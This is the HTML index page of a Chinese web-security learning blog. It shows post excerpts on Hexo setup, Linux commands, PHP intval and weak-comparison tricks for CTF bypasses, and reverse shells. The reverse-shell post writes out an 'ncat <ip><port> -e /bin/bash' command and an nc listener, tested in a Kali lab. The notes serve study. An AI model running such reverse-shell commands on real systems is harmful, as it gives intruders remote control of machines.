<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>INSOMNIA.__逃离失眠__</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="INSOMNIA.__逃离失眠__"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="INSOMNIA.__逃离失眠__"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Ins0mn1a"><meta property="og:url" content="https://luffys93.github.io/"><meta property="og:site_name" content="__逃离失眠__"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://luffys93.github.io/img/LUFFY.jpg"><meta property="article:author" content="Ins0mn1a"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://luffys93.github.io/img/LUFFY.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://luffys93.github.io"},"headline":"INSOMNIA.__逃离失眠__","image":["http://luffys93.github.io/img/og_image.png"],"author":{"@type":"Person","name":"Ins0mn1a"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/6.0.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="INSOMNIA.__逃离失眠__" type="application/atom+xml">
</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">INSOMNIA.__逃离失眠__</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/album">Album</a><a class="navbar-item" href="/friend">Friend</a><a class="navbar-item" href="/message">Message</a><a class="navbar-item" href="/self-talking">Self-talking</a><a class="navbar-item" href="/music">Music</a><a class="navbar-item" href="/media">Media</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card widget">
            <div class="card-content">
                <h3 class="menu-label">热门推荐</h3><span id="index_hot_div">加载中，请稍等...</span>
            </div>
        </div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-07-29  <a class="commentCountImg" href="/2024/07/29/hello-world/#comment-container"><span class="display-none-class">212d5e6f12a4c2d724f97255199c93a3</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="212d5e6f12a4c2d724f97255199c93a3">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>1 分钟  <i class="fas fa-pencil-alt"> </i>0.1 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/07/29/hello-world/">Hello World</a></h1><div class="content"><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-07-03  <a class="commentCountImg" href="/2024/07/03/Webbbb/Others/Shell/#comment-container"><span class="display-none-class">2a10abde0858cee43642148f4fc4bf17</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="2a10abde0858cee43642148f4fc4bf17">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>5 分钟  <i class="fas fa-pencil-alt"> </i>0.7 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/07/03/Webbbb/Others/Shell/">学习web安全的那些二三事-反弹Shell篇</a></h1><div class="content"><p>反弹Shell也是一个需要掌握的技巧<del>（实际上我也没掌握到多少，还搞得好混乱，只有找题来看看）</del></p>
<p>在有反弹shell之前，技术人员连接目标机器采用的是老早的传统连接方法，例如有Telnet、ssh、远程桌面协议等等，还有其他的第三方远程管理工具如VNC与一些批处理脚本。这些连接方式可以称为主动连接。</p>
<p>不过，有的目标机器会有一些限制：</p>
<ol>
<li>目标机器对连接进行了限制，即允许出站连接，但限制了很多入站连接，这作用与内网无异；</li>
<li>目标机器的某端口被占用，由于其本身的防火墙策略会导致ssh连接被阻断；</li>
<li>目标机器的ip是动态的，或者处于内网状态下（即目标机器处于局域网之中，ip地址由NAT管理）；</li>
</ol>
<p>反弹shell就是为了绕过上述条件而产生的，原理就是让目标机器主动连接外部设备。</p>
<p>反弹shell的方法有很多种，包括但不限于python脚本反弹，netcat反弹，bash反弹等等。</p>
<p>:::info</p>
<p>以下图示都是以kali作为攻击机来反弹shell，目标机器是ubuntu或者windows，图示会有说明</p>
<p>:::</p>
<h1 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h1><p>这个就比较简单粗暴了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ncat &lt;ip&gt;&lt;port&gt; -e /bin/bash</span><br><span class="line"><span class="comment"># nc是netcat的缩写，它们跟ncat的不同之处是：</span></span><br><span class="line"><span class="comment"># netcat比较传统，ncat比较现代化，说白了，ncat能做netcat所有能做的事</span></span><br><span class="line"><span class="comment"># 标注一下：ncat实际上是nmap的一部分，由nmap团队维护</span></span><br><span class="line"><span class="comment"># 不过不同发行版的nc似乎不同呢，ubuntu和kali就不太一样</span></span><br><span class="line"><span class="comment"># 比如这个-e，意思是在连接到目标端口后执行某一条命令，不过ubuntu没有这个选项</span></span><br><span class="line"><span class="comment"># 所以最好用ncat</span></span><br></pre></td></tr></table></figure>

<p><img src="./Shell.assets/e1b66b54cf1ded7c41fb50d89f485011.png" alt="e1b66b54cf1ded7c41fb50d89f485011"></p>
<p>左侧是kali，右侧是ubuntu</p>
<p>（正常情况来说是会显示用户名+主机名的，但是这里不知道为什么显示不出来）</p>
<p>windows应该是自带有bash的，也可以利用其来反弹shell</p>
<p><img src="./Shell.assets/image-20240703181705813.png" alt="image-20240703181705813"></p>
<p>左侧为kali，右侧为windows powershell</p>
<p>这里说一下攻击机的bash命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp &lt;port&gt;\</span><br><span class="line"><span class="comment"># -l：监听模式，即nc会监听指定的端口，等待连接；</span></span><br><span class="line"><span class="comment"># -v：详细模式，用于打印更多信息；</span></span><br><span class="line"><span class="comment"># -p：端口号，即输入的监听端口号；</span></span><br></pre></td></tr></table></figure>



</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-06-27  <a class="commentCountImg" href="/2024/06/27/Webbbb/linux/linux-second/#comment-container"><span class="display-none-class">3e143128b696180cc9ceee4cf9c181b6</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="3e143128b696180cc9ceee4cf9c181b6">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>1 分钟  <i class="fas fa-pencil-alt"> </i>0.1 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/06/27/Webbbb/linux/linux-second/">linux-second</a></h1><div class="content"><p>这里开始针对命令的一些骚操作了（顺序按字典排序）</p>
<h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><p>上次提到过，curl是用于在请求一个web服务器，也可以用于下载服务器上的文件，可以是一个网址，也可以是一个ip</p>
<p>一般情况下是这样的：</p>
<p><img src="./linux-second.assets/image-20240627135942710.png" alt="image-20240627135942710"></p>
<p>但是在输入ip时，你也可以将<code>.</code>换成<code>。</code>，对下列操作没有任何影响</p>
<p><img src="./linux-second.assets/image-20240627140044395.png" alt="image-20240627140044395"></p>
<p>这里猜测是url在检查的时候把<code>。</code>自动切换了为<code>.</code></p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-06-25  <a class="commentCountImg" href="/2024/06/25/Webbbb/linux/linux-first/#comment-container"><span class="display-none-class">d5cf132a93d50c3002056b8efc144b2e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d5cf132a93d50c3002056b8efc144b2e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>8 分钟  <i class="fas fa-pencil-alt"> </i>1.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/06/25/Webbbb/linux/linux-first/">学习web安全的那些二三事-linux篇（1）</a></h1><div class="content"><p>这一部分主要讲的是linux。</p>
<p>为什么要讲linux呢？<del>因为要用，其重要性不言而喻</del>。</p>
<p>（这些命令基于我在做运维和CTF题时总结的，有的因为年代久远忘记了，目前正在恢复中，遇到什么补上什么）</p>
<h1 id="linux中常用的几个命令"><a href="#linux中常用的几个命令" class="headerlink" title="linux中常用的几个命令"></a>linux中常用的几个命令</h1><p>按功能分类来说比较好一点，这样就可以知道在某些命令被过滤的情况下有哪些命令可以替代使用</p>
<h2 id="文件目录和操作"><a href="#文件目录和操作" class="headerlink" title="文件目录和操作"></a>文件目录和操作</h2><ol>
<li>ls：展示某个目录下的所有子目录以及文件（隐藏文件默认不展示），如果后面没有跟路径名，则默认展示当前目录；</li>
<li>cd：进入某个目录下，后面需要跟路径名</li>
<li>pwd：输出当前目录的绝对路径</li>
<li>mkdir/rmdir：创建一个目录</li>
<li>cp：将某个文件或目录复制到另外一个文件或目录</li>
<li>mv：移动或重命名某个文件或目录</li>
<li>find：查找文件或目录，输出其地址</li>
<li>tree：显示目录的分支结构</li>
<li>TO BE ADDED</li>
</ol>
<p>这里主要说一下ls的常用选项：</p>
<ol>
<li>-a 显示目录下所有的文件（包括隐藏文件）</li>
<li>-l 将列出的文件以长格式输出</li>
<li>-R 列出目录下的所有子目录和文件，若子目录中还有文件或子目录，则重复当前操作</li>
</ol>
<p>:::info</p>
<p>在大多数linux系统中，ls加部分选项是可以简写的，如ls -l可以简写成ll；</p>
<p>:::</p>
<h2 id="文件内容和查看"><a href="#文件内容和查看" class="headerlink" title="文件内容和查看"></a>文件内容和查看</h2><ol>
<li>cat/tac：前者按行号正序输出文件内容，后者按行号倒序输出文件内容；</li>
<li>more/less：分页显示文件内容</li>
<li>head/tail：默认情况下前者显示文件的前十行，后者显示文件的后十行</li>
<li>nl：显示文件内容并标明行号</li>
<li>touch：创建文件</li>
<li>rm：和rmdir差不多，不过这里针对的是文件</li>
<li>vi/vim：编辑文件</li>
<li>TO BE ADDED</li>
</ol>
<p>:::warning no-icon</p>
<p>这里的三个命令被称为linux文本处理三剑客，具体用法可以上网搜搜，这里只给出简单的例子</p>
<ol>
<li>grep：</li>
</ol>
<p><img src="./linux-first.assets/image-20240626133809229.png" alt="image-20240626133809229"></p>
<ol start="2">
<li>awk：</li>
</ol>
<p><img src="./linux-first.assets/image-20240626140352836.png" alt="image-20240626140352836"></p>
<ol start="3">
<li>sed：</li>
</ol>
<p><img src="./linux-first.assets/image-20240626141229565.png" alt="image-20240626141229565"></p>
<p>实际上，”三剑客“对于查找数据有着重要作用，如果能通过它们将其他命令灵活结合起来，那么我们就可以快速地从一堆冗余的文字中提取我们想要的数据，从而节省了许多时间。</p>
<p><del>我还不怎么会用，特别是条件的编写</del></p>
<p>当然了，它们也能对文本进行增、删、改，具体的呢就上网查查叭</p>
<p>:::</p>
<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><ol>
<li>chmod：更改文件和目录的权限</li>
<li>chown：更改文件和目录的拥有者</li>
<li>passwd：更改某用户的密码</li>
<li>sudo：以管理员身份执行某条命令</li>
<li>TO BE ADDED</li>
</ol>
<h2 id="压缩与打包"><a href="#压缩与打包" class="headerlink" title="压缩与打包"></a>压缩与打包</h2><ol>
<li><p>tar：打包某个文件或目录（有的博客会说它有压缩和解压功能，实际上它本身并不具有这些功能，只能通过调用其他其他的功能来完成这一过程）</p>
</li>
<li><p>gzip：将打包后的文件或目录进行压缩（一般后缀是tar.gz，因为它一般都是压缩tar文件）</p>
</li>
<li><p>zip/unzip：压缩或解压缩zip文件</p>
</li>
<li><p>TO BE ADDED</p>
</li>
</ol>
<h2 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h2><ol>
<li>wget/curl：从某个网站中获取文件或其他信息</li>
<li>netstat：显示网络连接信息</li>
<li>nc：连接目标主机的终端</li>
<li>ping：检测本地与目标的网络是否通畅</li>
<li>ssh：本地远程登录目标主机</li>
<li>TO BE ADDED</li>
</ol>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><ol>
<li>ps：查看进程信息，ps aux则是查看所有进程的信息</li>
<li>kill：停止进程的运行</li>
<li>TO BE ADDED</li>
</ol>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ol>
<li>whoami：查询自己是哪一位用户</li>
<li>echo：显示指定的文字，一般与重定向使用</li>
<li>TO BE ADDED</li>
</ol>
<h1 id="额外哆嗦的一些命令"><a href="#额外哆嗦的一些命令" class="headerlink" title="额外哆嗦的一些命令"></a>额外哆嗦的一些命令</h1><h2 id="文件内容和查看-1"><a href="#文件内容和查看-1" class="headerlink" title="文件内容和查看"></a>文件内容和查看</h2><ol>
<li>sort：给文件的每一行进行排序，默认是字典排序</li>
<li>uniq：将文件内容进行去重后输出</li>
<li>od：把文件转换成某种形式输出，包括字符，ascii，二进制，八进制，十六进制</li>
</ol>
<p>:::warning</p>
<p>上面几个命令不会直接对文件内容作任何更改的，只是输出的内容可能跟文件内容不一样</p>
<p>:::</p>
<ol start="4">
<li>strings：查找文件中指定内容并输出，默认情况下是查找长度至少为4的字符串</li>
<li>cut：按照输入的条件选取文本内容进行输出</li>
<li>paste：将指定的文件以列为单位进行合并并输出</li>
</ol>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-06-25  <a class="commentCountImg" href="/2024/06/25/Webbbb/PHP/php-first/#comment-container"><span class="display-none-class">87d5779899d2524f140cf86d470d1148</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="87d5779899d2524f140cf86d470d1148">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>17 分钟  <i class="fas fa-pencil-alt"> </i>2.5 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/06/25/Webbbb/PHP/php-first/">学习web安全的那些二三事-php篇（1）</a></h1><div class="content"><p>从大一入学学习安全到现在，我已经见识到许多基本漏洞以及这些漏洞的变形，这里就写几篇博客总结一下这段时间的学习，顺便也记录一下一些漏洞，以便查看</p>
<p>这里从一些常见的php的语言特性和函数开始说起</p>
<h1 id="1-intval"><a href="#1-intval" class="headerlink" title="1.intval"></a>1.intval</h1><p>细说一下intval的具体用法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p><code>intval</code>用于获取变量的整数值，$value为任意类型的变量，后面为进制数，意思是经过转化后输出该进制的数，如果没有数或者输入的数为0，则默认为十进制</p>
<p>这里罗列了以下几种输入（注释内容为intval转化后的内容）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">1.1</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;1c&#x27;</span>;<span class="comment">// 1</span></span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;c1&#x27;</span>;<span class="comment">// 0 </span></span><br><span class="line"><span class="variable">$j</span> = <span class="string">&#x27;2543sqd&#x27;</span>;<span class="comment">// 2543</span></span><br><span class="line"><span class="variable">$e</span> = <span class="number">2e10</span>;<span class="comment">// 20000000000</span></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;2e10&#x27;</span>; <span class="comment">// 20000000000</span></span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">array</span>(); <span class="comment">// 0</span></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">array</span>(<span class="number">12</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable">$i</span> = <span class="keyword">array</span>(<span class="string">&#x27;1ad&#x27;</span>,<span class="string">&#x27;wd&#x27;</span>); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>这里说一下e和f</p>
<p>$e作为一个浮点数，因为它使用了科学计数法，2e10代表2 * 10^10^，如果超出范围，则会输出0或者其他不确定的数（这里不是随机数，<del>每一个数对应一个定值</del>）</p>
<p>$f作为一个字符串，intval会先将其转化为数字然后再作进一步修改，如果转化后的数超出范围，则取最大的整数</p>
<p>有的ctf招新会这样出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;easy php!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里就可以利用上述例子提到的数组绕过</p>
<p>不过get传数组跟php里面传数组时处理的结果会不一样，get传参对数组的处理似乎有点复杂？（找时间复现一下然后加在这下面），而php里面，由于已经明确要传递空数组，因此判断方便（目前只能大体说说）</p>
<p>num就可以这样赋值：num[]=（啥都行）</p>
<h1 id="2-弱类型比较"><a href="#2-弱类型比较" class="headerlink" title="2.弱类型比较"></a>2.弱类型比较</h1><p>我们常见的弱类型比较就是<code>==</code>了</p>
<p>当数据在使用<code>==</code>，php会“悄悄”把数据类型进行转化，这样就不用其他的数据转化脚本。</p>
<p>这种“悄悄”的转化方式称为<strong>隐式类型转换</strong>，它应用于很多编程语言，例如c，javascript等</p>
<p> 在8.0版本以前，==的处理比较简单，举个栗子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;234&#x27;</span> == <span class="number">234</span>); <span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;234s&#x27;</span>== <span class="number">234</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;ss&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;ss1&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;1ss&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0x9&#x27;</span> == <span class="number">9</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0x9</span> == <span class="number">9</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;2e3&#x27;</span> == <span class="number">2000</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">2e3</span> == <span class="number">2000</span>);<span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure>

<p>这里的弱比较相当于在两端加上了intval</p>
<p>在8.0版本以后，开发者对==进行优化，对于数值字符串有一个很好的转换方法：</p>
<ol>
<li><p>若字符串符合数值字符串的定义，则直接作为字符串进行比较.</p>
</li>
<li><p>若字符串不符合数值字符串的定义，则将数值转化为字符串后再进行比较。</p>
</li>
</ol>
<p>数值字符串是指一个包含数字字符的字符串，而像0x7，0b1100110这种有明确进制标识符的不是数值字符串（当然，要符合进制的要求）</p>
<p>:::warning</p>
<p>如果像0x9这种数值被包上引号后则会被标识为数值字符串（<del>这么说会感觉有点矛盾</del>），没有被包上引号则作为数值出现</p>
<p>:::</p>
<p>以上数据输出如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;234&#x27;</span> == <span class="number">234</span>); <span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;234s&#x27;</span>== <span class="number">234</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;ss&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;ss1&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;1ss&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0x9&#x27;</span> == <span class="number">9</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0x9</span> == <span class="number">9</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;2e3&#x27;</span> == <span class="number">2000</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">2e3</span> == <span class="number">2000</span>);<span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure>

<p>更多内容的可以看看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44879989/article/details/133230251?ops_request_misc=&request_id=&biz_id=102&utm_term=php8%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E5%BC%B1%E6%AF%94%E8%BE%83&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-133230251.142^v100^pc_search_result_base4&spm=1018.2226.3001.4187">这个博客</a></p>
<p>附上几种数值的常见标识符：</p>
<p>二进制（0b），八进制（0），十六进制（0x），科学计数法（[0-9]e）</p>
<p>有的比赛会根据弱比较类型来考怎么绕过，这里列几个比较常见的</p>
<h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><p>对于md5而言，目前还没有一个好的算法来对md5编码进行解密，很多网站上的md5解密实际上是通过查询变量的md5值来进行破解的。说白了，破解者通过某些算法来生成字典并对这个md5进行爆破。因此，想通过某一个md5的值来破解得到明文在算法上并不可行</p>
<p>当md5出现在php时，又该怎么应对呢</p>
<p>一道经典的题型如下：</p>
